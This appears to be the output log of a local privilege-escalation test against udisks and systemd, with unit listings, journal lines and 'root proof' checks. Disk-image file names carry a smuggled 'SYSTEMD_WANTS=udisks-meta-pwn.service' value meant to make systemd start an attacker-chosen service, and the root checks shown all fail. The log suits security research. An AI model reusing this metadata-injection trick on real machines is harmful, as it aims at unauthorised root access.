  dev-loop2.device                                                                                  loaded    active   plugged /dev/loop2
  sys-devices-virtual-block-loop0.device                                                            loaded    active   plugged /sys/devices/virtual/block/loop0
  sys-devices-virtual-block-loop1.device                                                            loaded    active   plugged /sys/devices/virtual/block/loop1
  sys-devices-virtual-block-loop2.device                                                            loaded    active   plugged /sys/devices/virtual/block/loop2
  media-selfauth-meta_.._x.mount.mount                                                              loaded    active   mounted /media/selfauth/meta_.._x.mount
  media-selfauth-UDMETA\x20PWN.mount                                                                loaded    active   mounted /media/selfauth/UDMETA PWN

## systemd/tmpfiles/log consumers
No files found for udisks-meta-pwn.service.
May 16 18:59:13 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop0 (backed by /home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 18:59:13 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop1 (backed by /home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:00:09 4f5b414436ae udisksd[729973]: udisks_state_check_loop_entry: unexpected name for /dev/loop0 - expected `/home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img' but got `/home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img (deleted)'
May 16 19:00:09 4f5b414436ae udisksd[729973]: udisks_state_check_loop_entry: unexpected name for /dev/loop1 - expected `/home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img' but got `/home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img (deleted)'
May 16 19:00:18 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop0 (backed by /home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:00:18 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop1 (backed by /home/selfauth/udisks-metadata-systemd/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:00:18 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop2 (backed by /home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:00:18 4f5b414436ae udisksd[729973]: Mounted /dev/loop1 at /media/selfauth/UDMETA PWN on behalf of uid 1002
May 16 19:01:07 4f5b414436ae udisksd[729973]: udisks_state_check_loop_entry: unexpected name for /dev/loop1 - expected `/home/selfauth/udisks-metadata-systemd/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img' but got `/home/selfauth/udisks-metadata-systemd/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img (deleted)'
May 16 19:01:07 4f5b414436ae udisksd[729973]: Cleaning up mount point /media/selfauth/UDMETA PWN (device 7:1 no longer exists)
May 16 19:01:11 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop0 (backed by /home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:01:11 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop1 (backed by /home/selfauth/udisks-metadata-systemd/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:01:11 4f5b414436ae udisksd[729973]: Set up loop device /dev/loop2 (backed by /home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img)
May 16 19:01:11 4f5b414436ae udisksd[729973]: Mounted /dev/loop1 at /media/selfauth/UDMETA PWN on behalf of uid 1002

## root proof
ls: cannot access '/root/udisks-metadata-systemd-root': No such file or directory
ls: cannot access '/run/udisks-metadata-systemd-root': No such file or directory
ls: cannot access '/tmp/udisks-metadata-systemd-root': No such file or directory

## cleanup
ls: cannot access '/root/udisks-metadata-systemd-root': No such file or directory
ls: cannot access '/run/udisks-metadata-systemd-root': No such file or directory
ls: cannot access '/tmp/udisks-metadata-systemd-root': No such file or directory
running
